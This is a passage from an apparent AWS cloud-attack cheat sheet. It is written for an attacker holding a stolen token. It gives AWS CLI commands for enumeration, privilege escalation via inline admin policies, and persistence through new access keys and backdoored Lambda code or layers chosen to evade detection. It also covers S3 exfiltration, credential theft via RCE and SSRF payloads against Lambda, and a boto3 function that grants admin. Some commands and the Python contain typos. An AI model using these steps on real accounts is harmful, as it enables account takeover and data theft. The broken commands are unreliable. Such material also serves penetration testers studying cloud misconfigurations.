<ul>
<li>AWS token compromised (Developer machine, phishing etc) and we as attackers will gonna use it. </li>
</ul>
<h3 id="enumerating-the-owner-of-the-key-and-initial-compromise">Enumerating the owner of the key and initial compromise</h3>
<div class="highlight"><pre><span></span><code><a id="__codelineno-67-1" name="__codelineno-67-1" href="#__codelineno-67-1"></a>aws sts get-caller-identity
</code></pre></div>
<p>Or specifing a profile</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-68-1" name="__codelineno-68-1" href="#__codelineno-68-1"></a>aws sts get-caller-identity --profile example_name
</code></pre></div>
<p>If you have the password of the root account instead of key, log in</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-69-1" name="__codelineno-69-1" href="#__codelineno-69-1"></a>https://signin.aws.amazon.com/console
</code></pre></div>
<p>Or use the IAM in case the account is not the root</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-70-1" name="__codelineno-70-1" href="#__codelineno-70-1"></a>https://account-id-here.signin.aws.amazon.com/console
</code></pre></div>
<p><em>The account id can be cathered using the sts get caller command.</em></p>
<h3 id="privilege-escalation">Privilege Escalation</h3>
<ul>
<li>Privilege escalation on AWS is based on misconfigurations, if we have more permissions than necessary, its possible to obtain higher privileges.</li>
</ul>
<h4 id="study-case">Study Case</h4>
<ul>
<li>A user was compromised with the <em>List Policy</em> and <em>Put User Policy</em> permissions, an attacker could leverage this <em>Put User</em> privilege to add an inline administrator to itself, making it administrator of the instance.</li>
</ul>
<h5 id="exploitation">Exploitation</h5>
<ol>
<li>Getting the IAM user</li>
</ol>
<div class="highlight"><pre><span></span><code><a id="__codelineno-71-1" name="__codelineno-71-1" href="#__codelineno-71-1"></a>aws sts get-caller-identity
</code></pre></div>
<ol>
<li>Listing policies attached to an user</li>
</ol>
<div class="highlight"><pre><span></span><code><a id="__codelineno-72-1" name="__codelineno-72-1" href="#__codelineno-72-1"></a>aws iam list-attached-user-policies --user-name example_name -- profile example_profile
</code></pre></div>
<ol>
<li>Retrieving informations about an specific policy</li>
</ol>
<div class="highlight"><pre><span></span><code><a id="__codelineno-73-1" name="__codelineno-73-1" href="#__codelineno-73-1"></a>aws iam get-policy --policy-arn policy_arn
</code></pre></div>
<p>If there are more than one version of the policy, we can also list them</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-74-1" name="__codelineno-74-1" href="#__codelineno-74-1"></a>aws iam list-policy-versions --policy-arn policy_arn
</code></pre></div>
<p>Now we can finally retrieve the contents of the policy</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-75-1" name="__codelineno-75-1" href="#__codelineno-75-1"></a>aws iam get-policy-version --policy-arn example_arn --version-id id_example
</code></pre></div>
<p><em>It's important to use the command above to chech the information about the default policy</em></p>
<ol>
<li>Escalation</li>
</ol>
<p>If we have the PutUserPolicy is enabled, we can add an inline administrator policy to our user. </p>
<p>Administrator policy example</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-76-1" name="__codelineno-76-1" href="#__codelineno-76-1"></a><span class="p">{</span>
<a id="__codelineno-76-2" name="__codelineno-76-2" href="#__codelineno-76-2"></a><span class="w">    </span><span class="nt">&quot;Version&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;2021-10-17&quot;</span><span class="p">,</span>
<a id="__codelineno-76-3" name="__codelineno-76-3" href="#__codelineno-76-3"></a><span class="w">    </span><span class="nt">&quot;Statement&quot;</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="p">[</span>
<a id="__codelineno-76-4" name="__codelineno-76-4" href="#__codelineno-76-4"></a><span class="w">        </span><span class="p">{</span>
<a id="__codelineno-76-5" name="__codelineno-76-5" href="#__codelineno-76-5"></a><span class="w">            </span><span class="nt">&quot;Effect&quot;</span><span class="p">:</span><span class="s2">&quot;Allow&quot;</span><span class="p">,</span>
<a id="__codelineno-76-6" name="__codelineno-76-6" href="#__codelineno-76-6"></a><span class="w">            </span><span class="nt">&quot;Action&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">[</span>
<a id="__codelineno-76-7" name="__codelineno-76-7" href="#__codelineno-76-7"></a><span class="w">                </span><span class="s2">&quot;*&quot;</span>
<a id="__codelineno-76-8" name="__codelineno-76-8" href="#__codelineno-76-8"></a><span class="w">            </span><span class="p">],</span>
<a id="__codelineno-76-9" name="__codelineno-76-9" href="#__codelineno-76-9"></a><span class="w">            </span><span class="nt">&quot;Resource&quot;</span><span class="p">:[</span>
<a id="__codelineno-76-10" name="__codelineno-76-10" href="#__codelineno-76-10"></a><span class="w">                </span><span class="s2">&quot;*&quot;</span>
<a id="__codelineno-76-11" name="__codelineno-76-11" href="#__codelineno-76-11"></a><span class="w">            </span><span class="p">]</span>
<a id="__codelineno-76-12" name="__codelineno-76-12" href="#__codelineno-76-12"></a><span class="w">        </span><span class="p">}</span>
<a id="__codelineno-76-13" name="__codelineno-76-13" href="#__codelineno-76-13"></a><span class="w">    </span><span class="p">]</span>
<a id="__codelineno-76-14" name="__codelineno-76-14" href="#__codelineno-76-14"></a><span class="p">}</span>
</code></pre></div>
<h3 id="attaching-this-policy-into-our-user">Attaching this policy into our user</h3>
<div class="highlight"><pre><span></span><code><a id="__codelineno-77-1" name="__codelineno-77-1" href="#__codelineno-77-1"></a>aws iam put-user-policy --user-name example_username --policy-name example_name --policy-document file://AdminPolicy.json
</code></pre></div>
<h3 id="listing-inline-policies-of-our-user">Listing inline policies of our user</h3>
<div class="highlight"><pre><span></span><code><a id="__codelineno-78-1" name="__codelineno-78-1" href="#__codelineno-78-1"></a>aws iam list-user-policies --user-name example_name
</code></pre></div>
<h3 id="listing-a-restricted-resource-example-s3">Listing a restricted resource (Example S3)</h3>
<div class="highlight"><pre><span></span><code><a id="__codelineno-79-1" name="__codelineno-79-1" href="#__codelineno-79-1"></a>aws s3 ls --profile example_profile
</code></pre></div>
<h3 id="interesting-permissions">Interesting Permissions</h3>
<ul>
<li>iam:AttachUserPolicy -&gt; Attach a policy to a user</li>
<li>iam:AttachGroupPolicy -&gt; Attach a policy to a group</li>
<li>iam:AttachRolePolicy -&gt; Attach a policy to a role </li>
<li>iam:CreateAccessKey -&gt; Creates a new access key</li>
<li>iam:CreateLoginProfile -&gt; Creates a new login profile </li>
<li>iam:UpdateLoginProfile -&gt; Update an existing login profile</li>
<li>iam:PassRole and ec2:RunInstances -&gt; Creates an EC2 instance with an existing instance profile</li>
<li>iam:PuserUserPolicy -&gt; Create/Update an inline policy</li>
<li>iam:PutGroupPolicy -&gt; Create/Update an inline policy for a group</li>
<li>iam:PutRolePolicy -&gt; Create/Update an inline policy for a role </li>
<li>iam:AddUserToGroup -&gt; Add an user to a group</li>
<li>iam:UpdateAssumeRolePolicy and sts:AssumeRole -&gt; Update the AssumeRolePolicyDocument of a role </li>
<li>iam:PassRole,lambda:CreateFunction and lambda:InvokeFunction -&gt; Pass a role to a new lambda function and invoke it</li>
<li>lambda:UpdateFunctionCode -&gt; Update the code of an existing lambda function</li>
</ul>
<h3 id="persistence-backdooring">Persistence &amp; Backdooring</h3>
<ul>
<li>Suppose we have two users, the user A has permissions to create Access Keys to user B, this misconfig allows us to create an access key for user B and persist our access. </li>
</ul>
<h4 id="creating-a-new-access-key-for-another-user">Creating a new access key for another user</h4>
<div class="highlight"><pre><span></span><code><a id="__codelineno-80-1" name="__codelineno-80-1" href="#__codelineno-80-1"></a>aws iam create-access-key --username example_username
</code></pre></div>
<h4 id="configuring-aws-cli-for-the-new-user">Configuring AWS cli for the new user</h4>
<div class="highlight"><pre><span></span><code><a id="__codelineno-81-1" name="__codelineno-81-1" href="#__codelineno-81-1"></a>aws configure --profile example_profile
</code></pre></div>
<p><em>Remember, an user can have the maximum of 2 access keys</em>.</p>
<h4 id="testing-the-credential">Testing the credential</h4>
<div class="highlight"><pre><span></span><code><a id="__codelineno-82-1" name="__codelineno-82-1" href="#__codelineno-82-1"></a>aws sts get-caller-identity --profile example_profile
</code></pre></div>
<h4 id="accessing-more-credentials">Accessing more credentials</h4>
<ul>
<li>It's possible to assume other roles with the sts:AssumeRole permission (Example: An user doesn't have access to an s3 instance, but it has this permission, we can easily assume other roles if we are in the trust relashionship, increasing our access in the instance)</li>
</ul>
<h5 id="listing-managed-policies-attached-to-an-user">Listing managed policies attached to an user</h5>
<div class="highlight"><pre><span></span><code><a id="__codelineno-83-1" name="__codelineno-83-1" href="#__codelineno-83-1"></a>aws iam list-attached-user-policies --user-name example_name
</code></pre></div>
<h5 id="retrieving-information-about-an-specific-policy">Retrieving information about an specific policy</h5>
<div class="highlight"><pre><span></span><code><a id="__codelineno-84-1" name="__codelineno-84-1" href="#__codelineno-84-1"></a>aws iam get-policy --policy-arn ARN
</code></pre></div>
<h5 id="listing-information-about-the-version-of-the-policy">Listing information about the version of the policy</h5>
<div class="highlight"><pre><span></span><code><a id="__codelineno-85-1" name="__codelineno-85-1" href="#__codelineno-85-1"></a>aws iam list-policy-versions --policy-arn ARN
</code></pre></div>
<h5 id="retrieving-information-about-an-specific-version">Retrieving information about an specific version</h5>
<div class="highlight"><pre><span></span><code><a id="__codelineno-86-1" name="__codelineno-86-1" href="#__codelineno-86-1"></a>aws iam get-policy-version --policy-arn policy_arn --version-id ID
</code></pre></div>
<h5 id="listing-iam-roles_1">Listing IAM roles</h5>
<div class="highlight"><pre><span></span><code><a id="__codelineno-87-1" name="__codelineno-87-1" href="#__codelineno-87-1"></a>aws iam list-roles
</code></pre></div>
<h5 id="listing-trust-relashionship-between-role-and-user-which-roles-we-can-assume">Listing trust relashionship between role and user (Which roles we can assume)</h5>
<div class="highlight"><pre><span></span><code><a id="__codelineno-88-1" name="__codelineno-88-1" href="#__codelineno-88-1"></a>aws iam get-role --role-name role_name
</code></pre></div>
<h5 id="listing-all-managed-policies-attached-to-the-specific-iam-role">Listing all managed policies attached to the specific IAM role</h5>
<div class="highlight"><pre><span></span><code><a id="__codelineno-89-1" name="__codelineno-89-1" href="#__codelineno-89-1"></a>aws iam liast-attached-role-policies --role-name role_name
</code></pre></div>
<h5 id="retrieving-information-about-the-specified-version-of-the-policy">Retrieving information about the specified version of the policy</h5>
<div class="highlight"><pre><span></span><code><a id="__codelineno-90-1" name="__codelineno-90-1" href="#__codelineno-90-1"></a>aws iam get-policy-version --policy-arn policy_arn --version-id ID
</code></pre></div>
<h5 id="getting-temporary-credentials-for-the-role">Getting temporary credentials for the role</h5>
<div class="highlight"><pre><span></span><code><a id="__codelineno-91-1" name="__codelineno-91-1" href="#__codelineno-91-1"></a>aws sts assume-role --role-arn role_arn --role-session-name session_name
</code></pre></div>
<h5 id="configuring-aws-cli-with-newer-credentials-on-linux">Configuring AWS cli with newer credentials (On Linux)</h5>
<div class="highlight"><pre><span></span><code><a id="__codelineno-92-1" name="__codelineno-92-1" href="#__codelineno-92-1"></a>export AWS_ACCESS_KEY_ID
<a id="__codelineno-92-2" name="__codelineno-92-2" href="#__codelineno-92-2"></a>export AWS_SECRET_KEY
<a id="__codelineno-92-3" name="__codelineno-92-3" href="#__codelineno-92-3"></a>export AWS_SESSION_TOKEN
</code></pre></div>
<h5 id="getting-information-about-the-temporary-credential">Getting information about the temporary credential</h5>
<div class="highlight"><pre><span></span><code><a id="__codelineno-93-1" name="__codelineno-93-1" href="#__codelineno-93-1"></a>aws sts get-caller-identity
</code></pre></div>
<h2 id="s3-simple-storage-system">S3 - Simple Storage System</h2>
<ul>
<li>Storage system that allow users to store and retrieve data.</li>
<li>List,Get,Put and Delete operations can be performed on the objects of the bucket</li>
<li>Buckets are global, meaning that they are available to all regions</li>
<li>It's possible to bruteforce the bucket name and region in the URL</li>
<li>Its possible to apply ACL's to bucket and object level and bucket policies for bucket level</li>
<li>There is also time limited URL's and identity based policies</li>
<li>Identity policies are enumerated using IAM commands</li>
</ul>
<h2 id="enumeration">Enumeration</h2>
<h3 id="listing-all-buckets-in-aws-account">Listing all buckets in aws account</h3>
<div class="highlight"><pre><span></span><code><a id="__codelineno-94-1" name="__codelineno-94-1" href="#__codelineno-94-1"></a>aws s3api list-buckets
</code></pre></div>
<h3 id="getting-information-about-a-specific-bucket">Getting information about a specific bucket</h3>
<div class="highlight"><pre><span></span><code><a id="__codelineno-95-1" name="__codelineno-95-1" href="#__codelineno-95-1"></a>aws s3api get-bucket-acl --bucket name
</code></pre></div>
<h3 id="getting-information-about-a-specific-bucket-policy">Getting information about a specific bucket policy</h3>
<div class="highlight"><pre><span></span><code><a id="__codelineno-96-1" name="__codelineno-96-1" href="#__codelineno-96-1"></a>aws s3api get-bucket-policy --bucket name 
</code></pre></div>
<h3 id="getting-the-public-access-block-configuration-for-an-s3-bucket">Getting the Public Access Block configuration for an S3 bucket</h3>
<div class="highlight"><pre><span></span><code><a id="__codelineno-97-1" name="__codelineno-97-1" href="#__codelineno-97-1"></a>aws s3api get-public-access-block --bucket name
</code></pre></div>
<h3 id="listing-all-objects-in-a-specific-bucket">Listing all objects in a specific bucket</h3>
<div class="highlight"><pre><span></span><code><a id="__codelineno-98-1" name="__codelineno-98-1" href="#__codelineno-98-1"></a>aws s3api list-objects --bucket name
</code></pre></div>
<h3 id="getting-acl-information-about-specific-object">Getting ACL information about specific object</h3>
<div class="highlight"><pre><span></span><code><a id="__codelineno-99-1" name="__codelineno-99-1" href="#__codelineno-99-1"></a>aws s3api get-object-acl --bucket-name name --key object_name
</code></pre></div>
<h2 id="data-exfiltration">Data Exfiltration</h2>
<ul>
<li>It's possible to brute-force files in the bucket</li>
<li>If the bucket is misconfigured, we can read data through web browser, cli/api or time-based URL.</li>
</ul>
<h3 id="public-access">Public Access</h3>
<ul>
<li>Just enter the URL in the browser</li>
</ul>
<div class="highlight"><pre><span></span><code><a id="__codelineno-100-1" name="__codelineno-100-1" href="#__codelineno-100-1"></a>https://bucket-name.region.amazonaws.com/secret.txt
</code></pre></div>
<h3 id="authenticated-user">Authenticated User</h3>
<div class="highlight"><pre><span></span><code><a id="__codelineno-101-1" name="__codelineno-101-1" href="#__codelineno-101-1"></a>aws s3api get-object --bucket name --key object-name download-file-location
</code></pre></div>
<h3 id="time-based-url">Time-Based Url</h3>
<ul>
<li>Generate a time based url for an object</li>
<li>Userful if the object is not public</li>
</ul>
<div class="highlight"><pre><span></span><code><a id="__codelineno-102-1" name="__codelineno-102-1" href="#__codelineno-102-1"></a>aws s3 presign s3://bucket-name/object-name --expires-in 605000
</code></pre></div>
<h2 id="lambda-api-gateway">Lambda &amp; API Gateway</h2>
<ul>
<li>Serverless event driven platform</li>
<li>Runs code in response to events and automatically manages computing resources required by that code</li>
<li>Can trigger from other AWS services or call directly from the API Gateway</li>
<li>A lambda function is a piece of code that is executed whenever is triggered by an event from an event source</li>
<li>API Gateway is an AWS service for creating, publishing, maintaining, monitoring and securing REST, HTTP and WebSocket API</li>
<li>API Gateway can be used to trigger lambda functions in a synchronous (api gateway), asynchronous (event) or stream (Poll Based) way.</li>
<li>If we found a lambda function that access an S3 (Example) its possible to change its code and gain access to the files.</li>
<li>If API Gateway is used, we can enumerate the API to see how its possible to invoke the lambda function (Craft the URL).</li>
</ul>
<h2 id="enumeration_1">Enumeration</h2>
<h3 id="listing-all-lambda-functions">Listing All lambda functions</h3>
<div class="highlight"><pre><span></span><code><a id="__codelineno-103-1" name="__codelineno-103-1" href="#__codelineno-103-1"></a>aws lambda list-functions
</code></pre></div>
<h3 id="listing-information-about-a-specific-lambda-function">Listing information about a specific lambda function</h3>
<div class="highlight"><pre><span></span><code><a id="__codelineno-104-1" name="__codelineno-104-1" href="#__codelineno-104-1"></a>aws lambda get-function --function-name function_name
</code></pre></div>
<ul>
<li><em>This command enables us to download the source code of the lambda function</em></li>
</ul>
<h3 id="listing-policy-information-about-the-function">Listing policy information about the function</h3>
<div class="highlight"><pre><span></span><code><a id="__codelineno-105-1" name="__codelineno-105-1" href="#__codelineno-105-1"></a>aws lambda get-policy --function-name function_name
</code></pre></div>
<ul>
<li>We can get informations like who can execute this functions, ID and other informations with this command</li>
</ul>
<h3 id="listing-the-event-source-mapping-information-about-a-lambda-function">Listing the event source mapping information about a lambda function</h3>
<div class="highlight"><pre><span></span><code><a id="__codelineno-106-1" name="__codelineno-106-1" href="#__codelineno-106-1"></a>aws lambda list-event-source-mappings --function-name function_name
</code></pre></div>
<h3 id="listing-lambda-layers-depedencies">Listing Lambda Layers (Depedencies)</h3>
<div class="highlight"><pre><span></span><code><a id="__codelineno-107-1" name="__codelineno-107-1" href="#__codelineno-107-1"></a>aws lambda list-layers
</code></pre></div>
<h3 id="listing-full-information-about-a-lambda-layer">Listing full information about a lambda layer</h3>
<div class="highlight"><pre><span></span><code><a id="__codelineno-108-1" name="__codelineno-108-1" href="#__codelineno-108-1"></a>aws lambda get-layer-version --layer-name name --version-number version_number
</code></pre></div>
<h3 id="listing-rest-apis">Listing Rest API'S</h3>
<div class="highlight"><pre><span></span><code><a id="__codelineno-109-1" name="__codelineno-109-1" href="#__codelineno-109-1"></a>aws apigateway get-rest-apis
</code></pre></div>
<h3 id="listing-information-about-a-specific-api">Listing information about a specific API</h3>
<div class="highlight"><pre><span></span><code><a id="__codelineno-110-1" name="__codelineno-110-1" href="#__codelineno-110-1"></a>aws apigateway get-rest-api --rest-api-id ID
</code></pre></div>
<h3 id="listing-information-about-endpoints">Listing information about endpoints</h3>
<div class="highlight"><pre><span></span><code><a id="__codelineno-111-1" name="__codelineno-111-1" href="#__codelineno-111-1"></a>aws apigateway get-resources --rest-api-id ID
</code></pre></div>
<h3 id="listing-information-about-a-specific-endpoint">Listing information about a specific endpoint</h3>
<div class="highlight"><pre><span></span><code><a id="__codelineno-112-1" name="__codelineno-112-1" href="#__codelineno-112-1"></a>aws apigateway get-resource --rest-api-id ID --resource-id ID
</code></pre></div>
<h3 id="listing-method-information-for-the-endpoint">Listing method information for the endpoint</h3>
<div class="highlight"><pre><span></span><code><a id="__codelineno-113-1" name="__codelineno-113-1" href="#__codelineno-113-1"></a>aws apigateway get-method --rest-api-id ApiID --resource-id ID --http-method method
</code></pre></div>
<ul>
<li>Test various methods to see if the API supports it.</li>
</ul>
<h3 id="listing-all-versions-of-a-rest-api">Listing all versions of a rest api</h3>
<div class="highlight"><pre><span></span><code><a id="__codelineno-114-1" name="__codelineno-114-1" href="#__codelineno-114-1"></a>aws apigateway get-stages --rest-api-id ID
</code></pre></div>
<h3 id="getting-informatin-about-a-specific-version">Getting informatin about a specific version</h3>
<div class="highlight"><pre><span></span><code><a id="__codelineno-115-1" name="__codelineno-115-1" href="#__codelineno-115-1"></a>aws apigateway get-stage --res-api-id ID --stage-name NAME
</code></pre></div>
<h3 id="listing-api-keys">Listing API KEYS</h3>
<div class="highlight"><pre><span></span><code><a id="__codelineno-116-1" name="__codelineno-116-1" href="#__codelineno-116-1"></a>aws apigateway get-api-keys --include-values
</code></pre></div>
<h3 id="getting-information-about-a-specific-api-key">Getting information about a specific API Key</h3>
<div class="highlight"><pre><span></span><code><a id="__codelineno-117-1" name="__codelineno-117-1" href="#__codelineno-117-1"></a>aws apigateway get-api-key --api-key KEY
</code></pre></div>
<h2 id="initial-access">Initial Access</h2>
<ul>
<li>Its possible to get RCE through API Gateway if it executes commands.</li>
<li>If you can execute commands, there is a way to retrieve keys from the API Gateway, just use <code>env</code> , configure <code>aws cli</code> and proceed with the exploitation.</li>
</ul>
<h2 id="credential-access">Credential Access</h2>
<p>Getting credentials from Lambda can be done in 2 ways</p>
<ol>
<li>Keys in the source code</li>
<li>Keys in the enviroment variables</li>
</ol>
<p>These keys can be gathered using SSRF, RCE and so on.</p>
<h3 id="getting-credentials-using-rce">Getting credentials using RCE</h3>
<div class="highlight"><pre><span></span><code><a id="__codelineno-118-1" name="__codelineno-118-1" href="#__codelineno-118-1"></a>https://apigateway/prod/system?cmd=env
</code></pre></div>
<h3 id="getting-credentials-using-ssrf">Getting credentials using SSRF</h3>
<div class="highlight"><pre><span></span><code><a id="__codelineno-119-1" name="__codelineno-119-1" href="#__codelineno-119-1"></a>https://apigateway/prod/example?url=http://localhost:9001/2018-06-01/runtime/invocation/next
</code></pre></div>
<h3 id="getting-credentials-using-ssrf-and-wrappers">Getting credentials using SSRF and wrappers</h3>
<div class="highlight"><pre><span></span><code><a id="__codelineno-120-1" name="__codelineno-120-1" href="#__codelineno-120-1"></a>https://apigateway/prod/system?cmd=file:///proc/self/environ
</code></pre></div>
<h3 id="getting-credentials-from-lambda-enviroment-variables-cli">Getting credentials from lambda enviroment variables (cli)</h3>
<div class="highlight"><pre><span></span><code><a id="__codelineno-121-1" name="__codelineno-121-1" href="#__codelineno-121-1"></a>aws lambda get-function --function-name NAME
</code></pre></div>
<ul>
<li>It's important to enumerate the functions first with <code>aws lambda list-functions</code></li>
</ul>
<h2 id="persistence">Persistence</h2>
<ul>
<li>If the user has sufficient rights in the lambda function, its possible to download the source code, add a backdoor to it and upload. Everytime the lambda executes, the malicious code will also execute.</li>
<li>Always try to update the code of layers (depedencies) instead of the actual lambda code, this way our backdoor will be difficult to detect.</li>
</ul>
<h3 id="checking-which-user-is-executing">Checking which user is executing</h3>
<div class="highlight"><pre><span></span><code><a id="__codelineno-122-1" name="__codelineno-122-1" href="#__codelineno-122-1"></a>aws sts get-caller-identity
</code></pre></div>
<h3 id="checking-all-managed-policies-attached-to-the-user">Checking all managed policies attached to the user</h3>
<div class="highlight"><pre><span></span><code><a id="__codelineno-123-1" name="__codelineno-123-1" href="#__codelineno-123-1"></a>aws iam list-attached-user-policies --user-name user_name
</code></pre></div>
<h3 id="checking-informations-about-a-specific-policy">Checking informations about a specific policy</h3>
<div class="highlight"><pre><span></span><code><a id="__codelineno-124-1" name="__codelineno-124-1" href="#__codelineno-124-1"></a>aws iam get-policy-version --policy-arn arn --version-id ID
</code></pre></div>
<h3 id="listing-all-lambda-functions_1">Listing all lambda functions</h3>
<div class="highlight"><pre><span></span><code><a id="__codelineno-125-1" name="__codelineno-125-1" href="#__codelineno-125-1"></a>aws lambda list-functions --region region
</code></pre></div>
<h3 id="listing-information-about-the-specified-lambda">Listing information about the specified lambda</h3>
<div class="highlight"><pre><span></span><code><a id="__codelineno-126-1" name="__codelineno-126-1" href="#__codelineno-126-1"></a>aws lambda get-function --function-name name
</code></pre></div>
<ul>
<li>Download and analyze the codes</li>
</ul>
<h3 id="listing-policy-information-about-the-specific-lambda-function">Listing policy information about the specific lambda function</h3>
<div class="highlight"><pre><span></span><code><a id="__codelineno-127-1" name="__codelineno-127-1" href="#__codelineno-127-1"></a>aws lambda get-policy --function-name name --profile profile --region region
</code></pre></div>
<ul>
<li>We can grab informations like id, who can invoke and other details with this command (Helps to build the query to execute the lambda function).</li>
</ul>
<h3 id="listing-rest-apis_1">Listing Rest API'S</h3>
<div class="highlight"><pre><span></span><code><a id="__codelineno-128-1" name="__codelineno-128-1" href="#__codelineno-128-1"></a>aws apigateway get-rest-apis
</code></pre></div>
<h3 id="listing-information-about-a-specific-api_1">Listing information about a specific API</h3>
<div class="highlight"><pre><span></span><code><a id="__codelineno-129-1" name="__codelineno-129-1" href="#__codelineno-129-1"></a>aws apigateway get-rest-api --rest-api-id ID
</code></pre></div>
<h3 id="listing-information-about-endpoints_1">Listing information about endpoints</h3>
<div class="highlight"><pre><span></span><code><a id="__codelineno-130-1" name="__codelineno-130-1" href="#__codelineno-130-1"></a>aws apigateway get-resources --rest-api-id ID
</code></pre></div>
<h3 id="listing-information-about-a-specific-endpoint_1">Listing information about a specific endpoint</h3>
<div class="highlight"><pre><span></span><code><a id="__codelineno-131-1" name="__codelineno-131-1" href="#__codelineno-131-1"></a>aws apigateway get-resource --rest-api-id ID --resource-id ID
</code></pre></div>
<h3 id="listing-method-information-for-the-endpoint_1">Listing method information for the endpoint</h3>
<div class="highlight"><pre><span></span><code><a id="__codelineno-132-1" name="__codelineno-132-1" href="#__codelineno-132-1"></a>aws apigateway get-method --rest-api-id ApiID --resource-id ID --http-method method
</code></pre></div>
<ul>
<li>Test various methods to see if the API supports it.</li>
</ul>
<h3 id="listing-all-versions-of-a-rest-api_1">Listing all versions of a rest api</h3>
<div class="highlight"><pre><span></span><code><a id="__codelineno-133-1" name="__codelineno-133-1" href="#__codelineno-133-1"></a>aws apigateway get-stages --rest-api-id ID
</code></pre></div>
<h3 id="getting-informatin-about-a-specific-version_1">Getting informatin about a specific version</h3>
<div class="highlight"><pre><span></span><code><a id="__codelineno-134-1" name="__codelineno-134-1" href="#__codelineno-134-1"></a>aws apigateway get-stage --res-api-id ID --stage-name NAME
</code></pre></div>
<h3 id="uploading-the-backdoor-code-to-aws-lambda-function">Uploading the backdoor code to aws lambda function</h3>
<div class="highlight"><pre><span></span><code><a id="__codelineno-135-1" name="__codelineno-135-1" href="#__codelineno-135-1"></a>aws lambda update-function-code --function-name function --zip-file fileb://my-function.zip
</code></pre></div>
<h3 id="invoke-the-function">Invoke the Function</h3>
<div class="highlight"><pre><span></span><code><a id="__codelineno-136-1" name="__codelineno-136-1" href="#__codelineno-136-1"></a>curl https://uj3948ie.execute-api.us-east-2.amazonaws.com/default/EXAMPLE
</code></pre></div>
<p>Where</p>
<ol>
<li>API-ID -&gt; uj3948ie</li>
<li>Region -&gt; us-east-2</li>
<li>Resource (Endpoint) -&gt; EXAMPLE</li>
<li>Method -&gt; Get</li>
<li>Stage (Version) -&gt; default</li>
<li>API-Key -&gt; None</li>
</ol>
<p><em>All these details are gathered during the enumeration.</em></p>
<h2 id="privilege-escalation_1">Privilege Escalation</h2>
<ul>
<li>If we have a user with PassRole and CreateFunction roles and also AttachRolePolicy role in a Lambda Function, its possible to create a function with a code that changes the lambda role to admin then the user to Administrator.</li>
</ul>
<h3 id="create-a-lambda-function-and-attach-a-role-to-it">Create a lambda function and attach a role to it</h3>
<div class="highlight"><pre><span></span><code><a id="__codelineno-137-1" name="__codelineno-137-1" href="#__codelineno-137-1"></a>aws lambda create-function --function-name my-function --runtime python3.7 --zip-file fileb://my-function.zip --handler my-function.handler --role ARN --region region
</code></pre></div>
<ul>
<li>Inside the function's code, we will add the administrator permission to the role and to the user</li>
</ul>
<h4 id="example-code-to-add-the-permissions">Example code to add the permissions</h4>
<div class="highlight"><pre><span></span><code><a id="__codelineno-138-1" name="__codelineno-138-1" href="#__codelineno-138-1"></a><span class="kn">import</span> <span class="nn">boto3</span>
<a id="__codelineno-138-2" name="__codelineno-138-2" href="#__codelineno-138-2"></a><span class="kn">import</span> <span class="nn">json</span>
<a id="__codelineno-138-3" name="__codelineno-138-3" href="#__codelineno-138-3"></a>
<a id="__codelineno-138-4" name="__codelineno-138-4" href="#__codelineno-138-4"></a><span class="k">def</span> <span class="nf">handler</span><span class="p">(</span><span class="n">event</span><span class="p">,</span><span class="n">context</span><span class="p">)</span>
<a id="__codelineno-138-5" name="__codelineno-138-5" href="#__codelineno-138-5"></a>    <span class="n">iam</span> <span class="o">=</span> <span class="n">boto3</span><span class="o">.</span><span class="n">client</span><span class="p">(</span><span class="s2">&quot;iam&quot;</span><span class="p">)</span>
<a id="__codelineno-138-6" name="__codelineno-138-6" href="#__codelineno-138-6"></a>    <span class="n">iam</span><span class="o">.</span><span class="n">attach</span><span class="o">.</span><span class="n">role</span><span class="o">.</span><span class="n">policy</span><span class="p">(</span><span class="n">RoleName</span><span class="o">=</span><span class="s2">&quot;name&quot;</span><span class="p">,</span><span class="n">PolicyArn</span><span class="o">=</span><span class="s2">&quot;arn&quot;</span><span class="p">,)</span>
<a id="__codelineno-138-7" name="__codelineno-138-7" href="#__codelineno-138-7"></a>    <span class="n">iam</span><span class="o">.</span><span class="n">attach</span><span class="o">.</span><span class="n">user</span><span class="o">.</span><span class="n">policy</span><span class="p">(</span><span class="n">UserName</span><span class="o">=</span><span class="s2">&quot;name&quot;</span><span class="p">,</span><span class="n">PolicyArn</span><span class="o">=</span><span class="s2">&quot;arn&quot;</span><span class="p">,)</span>
<a id="__codelineno-138-8" name="__codelineno-138-8" href="#__codelineno-138-8"></a>    <span class="k">return</span> <span class="p">{</span>
<a id="__codelineno-138-9" name="__codelineno-138-9" href="#__codelineno-138-9"></a>        <span class="s1">&#39;statusCode&#39;</span><span class="p">:</span><span class="mi">200</span>
<a id="__codelineno-138-10" name="__codelineno-138-10" href="#__codelineno-138-10"></a>        <span class="s1">&#39;body&#39;</span><span class="p">:</span><span class="n">json</span><span class="o">.</span><span class="n">dumps</span><span class="p">(</span><span class="s2">&quot;Pwned&quot;</span><span class="p">)</span>
<a id="__codelineno-138-11" name="__codelineno-138-11" href="#__codelineno-138-11"></a>    <span class="p">}</span>
</code></pre></div>
<h3 id="invoke-a-lambda-function">Invoke a lambda function</h3>
<div class="highlight"><pre><span></span><code><a id="__codelineno-139-1" name="__codelineno-139-1" href="#__codelineno-139-1"></a>aws lambda invoke --function-name name response.json --region region 
</code></pre></div>
<h3 id="listing-managed-policies-to-see-if-the-change-worked">Listing managed policies to see if the change worked</h3>
<div class="highlight"><pre><span></span><code><a id="__codelineno-140-1" name="__codelineno-140-1" href="#__codelineno-140-1"></a>aws iam list-attached-user-policies --user-name user_name
</code></pre></div>
<h2 id="aws-secret-manager">AWS Secret Manager</h2>
<ul>
<li>AWS Service that encrypts and store secrets</li>
<li>Transparently decrypts and return in plaintext</li>
<li>KMS used to store keys (AWS Key and Customer Managed Key)</li>
<li>Asymmetric and Symmetric keys can be created using KMS</li>
</ul>
<h2 id="enumeration_2">Enumeration</h2>
<h3 id="listing-all-secrets-stored-by-secret-manager">Listing all secrets stored by Secret Manager</h3>
<div class="highlight"><pre><span></span><code><a id="__codelineno-141-1" name="__codelineno-141-1" href="#__codelineno-141-1"></a>aws secretsmanager list-secrets
</code></pre></div>
<h3 id="listing-information-about-a-specific-secret">Listing information about a specific secret</h3>
